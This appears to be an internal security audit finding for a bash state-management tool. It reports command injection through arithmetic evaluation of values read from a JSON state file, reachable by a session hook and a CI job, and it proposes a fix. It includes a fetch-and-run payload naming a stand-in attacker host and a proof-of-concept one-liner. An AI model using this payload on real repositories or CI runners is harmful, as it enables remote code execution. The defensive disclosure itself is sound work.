## P0

### L8-01 -- bash arithmetic-context command injection from `.edm-state.json`, reachable by the SessionStart hook with no user action

`bin/edm-state:2726` (and four sibling sinks). `-ge`/`-le` inside `[[ ]]` perform **arithmetic evaluation**, which recursively expands the operand and arithmetic-evaluates any array subscript in it -- and a subscript undergoes command substitution.

Triggering input: any repository containing `SRD/<anything>/.edm-state.json` with `"current_phase": "a[$(curl -s http://attacker/p | sh)]"`.

Attack path, no user action beyond opening a session: clone or `git pull` -> `hooks/hooks.json:8` (SessionStart) runs `edm-state session-start` -> `list_state_files` globs every state file -> `jq -r` emits the string verbatim -> line 2726 executes the substitution. The hook's `2>/dev/null || true` suppresses every trace.

Second reachable path, on CI: `.gitlab-ci.yml:327` (`test:state-validate`, **blocking**) runs `edm-state validate` over every tracked initiative on every MR pipeline, reaching `state_anomalies:858`. A branch that edits only a JSON data file gets code execution as the runner user.

Confirmed on bash 3.2.57: `x='a[$(touch /tmp/proof)]'; [[ "$x" -ge 1 ]]` creates the file.

Full sink list, all fed from `jq -r` on a state file, all values `cmd_set` validates on **write** while nothing validated them on **read**: `:858` and `:2450` and `:2726` (`.current_phase`), `:771` (`.schema_version`, called from 8 sites including `gate-check`, `phase-complete`, `archive`, `audit-converged`), `:1828` (`.schema_version` in `cmd_migrate_schema`).

**Fix**: coerce at the read site. Either a `case "$phase" in ''|*[!0-9]*) phase=0 ;; esac` guard (the idiom already at `evals/run-eval.sh:470-473`) or force the type in jq. Note the fix is required even where a given bash build closes the subscript path: `phase=PATH` makes the comparison read `$PATH`, and `phase="2.0"` prints a bare arithmetic syntax error from inside a hook.

## Noted / Not Actionable
- `edm-lint-artifacts:104,367,379` -- the `grep -qP` probe plus the `LC_ALL=C` `[[:print:][:space:]]` fallback is the documented detection branch, correctly built, with a positive control. The only `grep -P` family use in `bin/`.
- `wave7-smoke.sh:263`, `:1374` -- `sed -i.bak` with an attached suffix is accepted by both BSD and GNU; the in-file comment records why.
- `harness-smoke.sh:43,61` -- `mktemp -t` produces differently-shaped names across GNU/BSD/busybox but all three yield a usable unique path. Cosmetic; folds into L8-08.
- `bin/edm-state:416-421`, `:1202`, `:2813`, `:3565` -- `${f}.tmp.$$` under a tracked directory is predictable, but the containing directory is the repository working tree: anyone who can plant a symlink there can already write the target directly, so there is no privilege boundary to cross. The `mv`-into-place discipline is correct.
- Em dashes under `bin/tests/` -- explicitly carved out of the ASCII sweep; comments, never read as prompt text.
- `evals/run-eval.sh:151` `git add -A` -- violates the staging convention but operates on a throwaway scratch repo, never the user's tree.
- `bin/edm-state:705` -- `flock` on fd 200, deliberately above the range bash internals and `BASH_XTRACEFD` use; correct for bash 3.2, which has no `{fd}` auto-assignment. No fd conflicts found anywhere in scope, and no `while read` loop feeds stdin to an inner command that also wants it.
- `edm-compare-eval` -- clean for this lens; JSON values reach `awk -v`, which assigns them as string data, not program text.
- Hardcoded `sed -n 'A,Bp'` help ranges in `edm-check-grants:67`, `run-eval.sh:55`, `score-artifacts.sh:100` -- all three truncate their own exit-code contracts mid-list. Out of this lens (documentation drift); recorded here so it is picked up rather than dropped.
- `bin/edm-state:771` with a non-integer `schema_version` -- a bare arithmetic syntax error on stderr and the "below minimum" branch. Subsumed by the L8-01 fix.
